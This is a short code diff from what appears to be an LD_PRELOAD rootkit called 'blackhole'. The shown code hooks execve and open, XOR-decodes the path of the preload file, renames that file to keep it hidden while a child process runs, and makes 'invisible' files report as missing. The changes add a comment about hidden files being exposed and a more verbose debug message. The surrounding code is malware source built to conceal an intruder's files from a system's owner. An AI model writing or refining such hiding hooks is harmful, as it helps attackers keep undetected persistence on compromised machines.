@@ -308,6 +308,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
         xor(ld_normal);
         xor(ld_hide);
 
+        // This leaves the hidden files exposed during the execution of the child process
         syscall_list[SYS_RENAME].syscall_func(ld_normal, ld_hide); // rename the ld file to hide it
 
         // Create a new process
@@ -414,7 +415,7 @@ DIR *opendir(const char *pathname) {
 
 // Hooked open function to hide invisible files
 int open(const char *pathname, int flags, mode_t mode) {
-    DEBUG("[blackhole]: open hooked\n");
+    DEBUG("[blackhole]: open hooked %s\n", pathname);
 
     if (is_invisible(pathname)) {
         errno = ENOENT;
